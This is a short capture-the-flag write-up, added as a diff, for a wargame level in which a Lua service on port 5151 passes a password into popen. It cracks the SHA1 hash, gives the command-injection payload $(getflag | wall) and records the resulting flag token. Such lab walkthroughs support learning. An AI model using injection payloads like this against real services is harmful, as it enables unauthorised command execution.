@@ -1,0 +1,17 @@
+There is a lua script that listens in port 5151 and expects a password. There is
+a line in which compares the input to a sha1sum hash, this hash decoded is
+'NotSoEasy' :(
+
+After researching the function 'popen', I see it is vulnerable to command
+injections. So I can try to input a command as a password between $() or ``.
+
+```$(getflag | wall)```
+
+-----------------------------------------------
+flag11 password:
+token:				fa6v5ateaw21peobuub8ipe6s
+-----------------------------------------------
+
+Links:
+https://seclists.org/fulldisclosure/2014/May/128
+https://mike-boya.github.io/post/exploit-exercises-nebula-level12/
